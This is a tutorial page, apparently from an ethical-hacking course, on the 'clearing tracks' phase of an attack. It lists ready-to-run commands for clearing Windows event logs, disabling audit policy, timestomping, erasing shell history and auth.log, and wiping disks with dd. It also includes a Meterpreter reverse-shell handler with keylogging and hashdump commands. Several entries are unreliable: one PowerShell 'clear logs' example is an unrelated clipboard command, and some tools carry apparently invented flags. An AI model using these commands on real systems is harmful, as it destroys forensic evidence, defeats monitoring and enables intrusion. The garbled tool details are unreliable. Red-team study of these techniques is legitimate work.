Phase 5

Clearing Tracks

The final phase of ethical hacking involves clearing tracks to erase any evidence of compromise. This step is crucial for simulating real-world attackers who aim to remain undetected after gaining access. Ethical hackers use this phase to evaluate how well an organization can detect, log, and respond to unauthorized actions.

Understanding Clearing Tracks

Clearing Tracks is the critical final phase in the hacking lifecycle. After an attacker has successfully exploited a system or gained elevated access, their next goal is to remain undetected. This phase involves eliminating any digital fingerprints that could lead to detection, forensic analysis, or attribution.

Log Clearing

Removing or altering logs using tools like `ClearLogs`, `auditpol`, or `wevtutil` to hide unauthorized actions.

Timestamp Manipulation

Changing file access/modification times using tools like `Timestomp` to evade timeline analysis.

Featured Tools

Timestomp

A tool that modifies file timestamp metadata (MAC times) to conceal unauthorized activity on a compromised system.

Forensics Evasion Post-Exploitation Cover Tracks
How to Use Timestomp
timestomp.exe file.txt -m 01/01/2000
🔹 Description:

Timestomp is a utility used to edit a file’s timestamps — including creation, access, modification, and MFT (Master File Table) times — in order to hide malicious activity from forensic analysis.

🚀 Common Use Cases:
  • Modify last modified date:
    timestomp.exe file.txt -m 01/01/2000
  • Set all timestamps to match another file:
    timestomp.exe file.txt -f reference.txt
  • Clear all timestamps:
    timestomp.exe file.txt -z
  • View timestamps of a file:
    timestomp.exe file.txt
📘 Flag Reference:
  • -m — Set modified date
  • -a — Set accessed date
  • -c — Set created date
  • -z — Zero out all timestamps
  • -f — Copy timestamps from another file
⚠️ Notes:
  • Timestomp is a **Windows-based** binary — must be run on NTFS systems.
  • Commonly used in combination with Meterpreter (Metasploit).
  • Use only in legal red team simulations or lab environments.
ClearLogs

A forensic anti-detection utility used to clear Windows event logs, hiding evidence of unauthorized or post-exploitation activity.

Forensics Evasion Windows Cover Tracks
How to Use ClearLogs
wevtutil cl Security
🔹 Description:

ClearLogs is not a standalone tool but refers to techniques or commands used to delete Windows Event Logs. This is often used post-exploitation to erase evidence from the system's Security, Application, or System logs.

🚀 Common Commands:
  • Clear Security log:
    wevtutil cl Security
  • Clear Application log:
    wevtutil cl Application
  • Clear System log:
    wevtutil cl System
  • Clear all logs (PowerShell):
    Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
📘 Notes:
  • wevtutil is a native Windows command-line tool.
  • Clearing logs will leave a suspicious gap or an empty log — can alert blue teams.
  • Some attackers use log modification instead of full deletion to remain stealthier.
  • Admin privileges are required to clear logs.
⚠️ Legal Warning:
  • **Clearing event logs on unauthorized systems is illegal.**
  • Use only in penetration testing labs or CTFs with explicit permission.
Meterpreter

A powerful, dynamic payload that runs in memory and provides post-exploitation capabilities after a successful Metasploit exploit.

Post-Exploitation In-Memory Persistence
How to Use Meterpreter
msfconsole

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
🔹 Description:

Meterpreter is an advanced, memory-resident payload from the Metasploit Framework. It allows attackers to control and manipulate compromised systems without writing to disk, helping evade antivirus and forensics tools.

🚀 Common Post-Exploitation Commands:
  • sysinfo — View target system info
  • getuid — Show current user
  • shell — Drop into a command shell
  • keyscan_start / keyscan_dump — Start keylogger and dump keystrokes
  • screenshot — Capture a screenshot
  • hashdump — Dump password hashes
  • migrate PID — Migrate Meterpreter to another process
📘 Payload Variants:
  • windows/meterpreter/reverse_tcp — TCP reverse shell
  • windows/x64/meterpreter/reverse_https — Encrypted HTTPS C2
  • linux/x64/meterpreter_reverse_tcp — Linux support
⚠️ Notes:
  • Meterpreter runs entirely in memory — great for stealth.
  • Typically delivered using an exploit in Metasploit.
  • Always use with explicit permission in penetration testing environments.
  • Session interaction: sessions → interact [id]

Auditpol

A Windows command-line utility for viewing and modifying audit policy settings — often used to disable logging and cover malicious activity.

Cover Tracks Audit Policy Windows
How to Use Auditpol
auditpol /clear /y
🔹 Description:

Auditpol is a command-line tool included in Windows that allows you to query and configure audit policy settings. Attackers and red teamers can abuse it to **disable auditing** or **clear audit logs**, making it a useful tool for stealth operations.

🚀 Common Commands:
  • View current audit policies:
    auditpol /get /category:*
  • Clear all audit policies:
    auditpol /clear /y
  • Disable logon/logoff auditing:
    auditpol /set /subcategory:"Logon" /success:disable /failure:disable
  • Disable all auditing:
    auditpol /set /subcategory:* /success:disable /failure:disable
📘 Flag Reference:
  • /get — View current settings
  • /set — Change audit policy per subcategory
  • /clear — Clear all configured policies
  • /category & /subcategory — Specify specific areas to modify
⚠️ Notes:
  • Requires administrative privileges
  • Disabling auditing can help avoid detection but may also raise suspicion
  • Use **only** in authorized testing environments or red team labs
Wevtutil

A Windows command-line tool used to manage event logs — view, export, or clear logs to remove traces of malicious activity.

Forensics Evasion Windows Logs Cover Tracks
How to Use Wevtutil
wevtutil cl Security
🔹 Description:

Wevtutil (Windows Events Utility) is a built-in Windows command-line tool used to **query**, **backup**, and **clear event logs**. It is frequently used in penetration testing to cover tracks after exploitation by wiping Security, Application, or System logs.

🚀 Common Use Cases:
  • Clear Security log:
    wevtutil cl Security
  • Clear System log:
    wevtutil cl System
  • Clear Application log:
    wevtutil cl Application
  • List all logs:
    wevtutil el
  • Export a log before clearing:
    wevtutil epl Security security.evtx
📘 Command Reference:
  • cl — Clear log
  • el — Enumerate logs
  • epl — Export log
  • gli — Get log info
  • gli [logname] — Show full metadata
⚠️ Notes:
  • Requires administrative privileges.
  • Clearing logs can trigger security alerts if detected by a SIEM.
  • Best used in **controlled labs or red team simulations** with permission.
  • Export logs before clearing if you want to analyze later.
LogCleaner

A specialized utility used in red team and forensic evasion scenarios to clear or corrupt Windows event logs, security traces, or third-party logs.

Anti-Forensics Log Tampering Cover Tracks
How to Use LogCleaner
LogCleaner.exe /log security
🔹 Description:

LogCleaner is a third-party or custom post-exploitation tool used to erase or tamper with Windows Event Logs. It goes beyond native tools by offering stealthier techniques — like selectively deleting events or corrupting entries to avoid SIEM alerts.

🚀 Common Use Cases:
  • Erase specific logs:
    LogCleaner.exe /log security
  • Target system logs:
    LogCleaner.exe /log system
  • Wipe all logs silently:
    LogCleaner.exe /all /silent
  • Spoof timestamps or truncate log size:
    LogCleaner.exe /spoof /truncate
📘 Example Flags:
  • /log [name] — Target a specific log (e.g., Security, System)
  • /all — Target all logs
  • /silent — Suppress output for stealth
  • /spoof — Falsify or randomize timestamps
  • /truncate — Forcefully shrink or corrupt logs
⚠️ Notes:
  • Requires **admin or SYSTEM privileges** to execute properly.
  • May bypass some SIEM detection rules if logs are altered — use only in labs.
  • Highly detectable by forensic teams if used without caution.
  • Ensure legality — use strictly in CTFs, red teaming, or training environments.
History Eraser

A technique or utility used to remove browser history, terminal commands, and user activity traces from systems to avoid forensic detection.

Cover Tracks Privacy System Logs
How to Use History Eraser 
history -c && rm ~/.bash_history
🔹 Description:

History Eraser involves clearing user activity records from shell history, browser logs, or system files. It's often used in red team or CTF environments to remove traces of executed commands or access trails.

🚀 Common Linux Commands:
  • Clear current shell history:
    history -c
  • Delete bash history file:
    rm ~/.bash_history
  • Unset HISTFILE variable:
    unset HISTFILE
  • Clear sudo logs (risky):
    echo "" > /var/log/auth.log
🚀 Windows Tips:
  • Delete Run history:
    reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f
  • Clear recent files:
    del /q %APPDATA%\\Microsoft\\Windows\\Recent\\*
  • Wipe PowerShell history:
    Remove-Item (Get-PSReadlineOption).HistorySavePath
⚠️ Notes:
  • Removing history may still leave forensic traces in RAM, swap, or shadow copies.
  • Only use in labs or environments where log erasure is allowed (e.g., red team simulations).
  • For deeper deletion, combine with tools like Sdelete or log cleaners.
CoverMyAss (CMA)

A Linux-based anti-forensics script that clears log files, shell histories, and system artifacts to erase traces of an attacker’s presence.

Anti-Forensics Linux Cover Tracks
How to Use CoverMyAss (CMA)
bash cma.sh
🔹 Description:

CoverMyAss (CMA) is an anti-forensics shell script designed to clean up traces of a user's presence on Linux systems. It clears log files, wipes shell history, removes user activity traces, and can manipulate timestamps to obscure malicious actions.

🚀 Key Features:
  • Clears log files such as /var/log/auth.log, /var/log/syslog, etc.
  • Wipes shell history: ~/.bash_history, history -c
  • Removes commands from ~/.zsh_history or other shells
  • Deletes login records: utmp, wtmp, lastlog
  • Optionally modifies timestamps (touch spoofing)
⚠️ Important Notes:
  • Designed for Linux only — must be run with root permissions for full effect.
  • Use in **controlled red team labs or CTF scenarios** only.
  • Overuse can cause forensic inconsistencies or corruption of log systems.
  • May trigger alerts in hardened environments or monitored systems.
🛡️ Usage in Simulations:
  • Deploy after privilege escalation or command execution phase.
  • Combine with timestomp, sdelete, or auditpol for complete log obfuscation.
  • Use a cloned VM to safely test impact on system visibility and recoverability.
Shred

A Linux utility that securely overwrites and deletes files, making data recovery nearly impossible — used for forensics evasion and permanent deletion.

Forensics Evasion Linux File Wipe
How to Use Shred
shred -u -z -n 3 secret.txt
🔹 Description:

Shred is a Linux command-line tool that overwrites files with random data to prevent recovery, then optionally deletes them. It is useful for securely wiping sensitive evidence or logs during post-exploitation.

🚀 Common Use Cases:
  • Securely delete a file with 3 passes and zero-fill:
    shred -u -z -n 3 secret.txt
  • Overwrite a file without deleting it:
    shred -n 5 confidential.doc
  • Wipe multiple files:
    shred -u -z *.log
📘 Flag Reference:
  • -u — Truncate and remove the file after overwriting
  • -z — Add a final overwrite with zeroes to hide shredding
  • -n — Number of times to overwrite (default is 3)
⚠️ Notes:
  • Not guaranteed to work on journaled filesystems like ext3 or ext4 unless journaling is disabled.
  • Does not overwrite file names or metadata.
  • For full-disk or partition wiping, use tools like dd or wipe.
  • Use only in authorized testing environments or red team labs.
Secure-delete (srm)

A Linux utility from the Secure-Delete suite that irreversibly deletes files by overwriting their contents multiple times to prevent forensic recovery.

Secure Deletion Linux Cover Tracks
How to Use Secure-delete (srm)
srm -vz confidential.txt
🔹 Description:

srm is part of the Secure-Delete toolkit and works by overwriting file data, renaming it, and then deleting it — making recovery with forensic tools nearly impossible. It's a go-to utility for securely wiping sensitive files in Linux environments.

🚀 Common Use Cases:
  • Securely delete a file:
    srm confidential.txt
  • Verbose output and zero overwriting at end:
    srm -vz confidential.txt
  • Delete a directory recursively:
    srm -r secrets/
  • Force overwrite if permission is denied:
    srm -f confidential.txt
📘 Flag Reference:
  • -v — Verbose mode (shows progress)
  • -z — Final overwrite with zeroes
  • -r — Recursive deletion (for folders)
  • -f — Force deletion (ignore warnings)
⚠️ Notes:
  • Works best on non-journaled filesystems (e.g., ext2). Less effective on ext3/ext4 due to journaling.
  • Does not securely delete file metadata or filenames in some configurations.
  • Ideal for post-exploitation cleanup in Linux systems.
  • Only use in legal penetration testing or red team labs.
BleachBit (CLI)

A powerful privacy tool that securely deletes system and app traces in Linux and Windows. CLI mode allows silent execution — ideal for anti-forensics scripting.

Privacy Cross-Platform Cover Tracks
How to Use BleachBit (CLI Mode) 
bleachbit -c system.cache system.logs
🔹 Description:

BleachBit in CLI mode is used to clean system files, logs, temporary data, browser traces, and application leftovers. It supports both Linux and Windows, making it ideal for stealthy track removal in scripts or shell sessions.

🚀 Common CLI Commands:
  • Wipe system cache and logs:
    bleachbit -c system.cache system.logs
  • Erase bash history and recent files:
    bleachbit -c system.bash_history system.recent_documents
  • List available cleaners:
    bleachbit -l
  • Preview without deleting:
    bleachbit -p system.cache
📘 Useful Cleaner Categories:
  • system.cache — Temporary files and caches
  • system.logs — System log files
  • firefox.history — Firefox browsing history
  • system.bash_history — Shell command history
  • system.recent_documents — “Recent” file lists
⚠️ Notes:
  • Run as root/admin to access all system traces.
  • Perfect for combining into post-exploitation cleanup scripts.
  • Not a file shredder — pair with shred or srm for secure deletion.
  • Always test commands with -p (preview) before using -c in production labs.
LogWiper

A specialized log-clearing utility used to delete or obfuscate Linux or Windows system logs — often used during red team exercises to eliminate digital evidence.

Anti-Forensics Log Deletion Cover Tracks
How to Use LogWiper
python3 logwiper.py --target /var/log/
🔹 Description:

LogWiper is a custom or open-source anti-forensics script used to remove, overwrite, or corrupt logs from a system. It can be tailored to target /var/log in Linux or Event Viewer logs in Windows environments (if adapted).

🚀 Common Use Cases:
  • Delete all Linux log files:
    python3 logwiper.py --target /var/log/
  • Wipe user-specific logs:
    python3 logwiper.py --target ~/.bash_history
  • Zero logs instead of deletion:
    python3 logwiper.py --target /var/log/ --mode zero
  • Recursive deletion:
    python3 logwiper.py --target /var/log/ --recursive
📘 Example Arguments:
  • --target — Path to the log file or directory
  • --mode [delete|zero|truncate] — How to wipe
  • --recursive — Apply to all files/folders inside
  • --silent — Suppress all console output
⚠️ Notes:
  • May require root or SYSTEM privileges.
  • Altering logs can trigger alerts or cause file integrity mismatches.
  • Only use in safe, isolated labs or during authorized engagements.
  • Best paired with timestomp or CMA to fully obscure presence.
PowerShell Scripts

Powerful scripts used to automate log deletion, clear history, disable auditing, and maintain stealth in Windows systems.

Windows Cover Tracks Post-Exploitation
How to Use PowerShell Scripts 
powershell -ExecutionPolicy Bypass -File clear_logs.ps1
🔹 Description:

PowerShell scripts are extremely versatile in Windows post-exploitation. They are used to remove logs, wipe history, disable logging policies, or maintain access while minimizing forensic footprints.

🚀 Example Use Cases:
  • Clear Windows event logs:

    Set-Clipboard -Value ''

📘 Useful Script Examples:
  • clear_logs.ps1 — Clears event, command, and PowerShell history
  • persistence.ps1 — Adds scheduled task for persistence
  • disable_audit.ps1 — Disables Windows auditing via auditpol
⚠️ Notes:
  • Run with elevated privileges for full access to logs and policies.
  • Use -ExecutionPolicy Bypass to avoid script blocking.
  • PowerShell logging may still be captured by advanced EDR unless completely disabled.
  • Use only in safe labs, CTFs, or explicitly authorized engagements.
dd (Disk Cleaner)

A powerful Unix command-line tool used to overwrite entire drives, partitions, or unallocated space to prevent data recovery.

Linux Wipe Disk Anti-Forensics
How to Use dd (Disk Cleaner)
dd if=/dev/zero of=/dev/sdX bs=1M status=progress
🔹 Description:

`dd` is a low-level command-line utility used for copying and converting data. It's commonly used to securely wipe drives or partitions by overwriting them with zeroes or random data to prevent forensic recovery.

🚀 Common Use Cases:
  • Wipe a disk with zeroes:
    dd if=/dev/zero of=/dev/sdX bs=1M
  • Wipe a disk with random data:
    dd if=/dev/urandom of=/dev/sdX bs=1M
  • Wipe free space (file-based):
    dd if=/dev/zero of=zerofile bs=1M
    Then: rm zerofile
  • Clone a drive:
    dd if=/dev/sda of=/dev/sdb bs=64K conv=noerror,sync
📘 Flag Reference:
  • if — Input file (e.g. /dev/zero, /dev/urandom)
  • of — Output file (e.g. /dev/sdX target disk)
  • bs — Block size (e.g. 1M)
  • status=progress — Show live progress
⚠️ Notes:
  • Be extremely cautious! Using the wrong output device (e.g. /dev/sda) can wipe your OS drive permanently.
  • Use lsblk or fdisk -l to identify disk devices.
  • Only use in controlled labs or with explicit permission.
  • To fully erase SSDs, use tools designed for their firmware (e.g. blkdiscard, hdparm --security-erase).
LogEraser

A flexible log wiping script used in red team operations to erase or corrupt system logs, bash history, and security events — supporting both Windows and Linux.

Anti-Forensics Cross-Platform Cover Tracks
How to Use LogEraser
python3 logeraser.py --fast
🔹 Description:

LogEraser is a customizable script-based tool used to erase system logs, authentication records, bash history, and other traces of user activity on both Windows and Linux systems. It can operate silently and is often used during the final stages of red team operations.

🚀 Common Use Cases:
  • Erase Linux logs:
    python3 logeraser.py --target /var/log/
  • Wipe bash history:
    python3 logeraser.py --bash
  • Silent full log erase:
    python3 logeraser.py --fast --silent
  • Windows mode (PowerShell backed):
    logeraser.exe --eventlogs
📘 Flag Reference:
  • --target — Set the log directory to wipe (e.g., `/var/log`)
  • --bash — Clears `.bash_history`
  • --fast — Runs common cleanup tasks
  • --silent — Hides console output
  • --eventlogs — Targets Windows event logs
⚠️ Notes:
  • Always verify file paths to avoid wiping critical system files unintentionally.
  • Admin/root privileges are required to erase protected logs.
  • Use in isolated labs or authorized red team environments only.
  • Pair with tools like Timestomp, Auditpol, or CMA for complete trace removal.
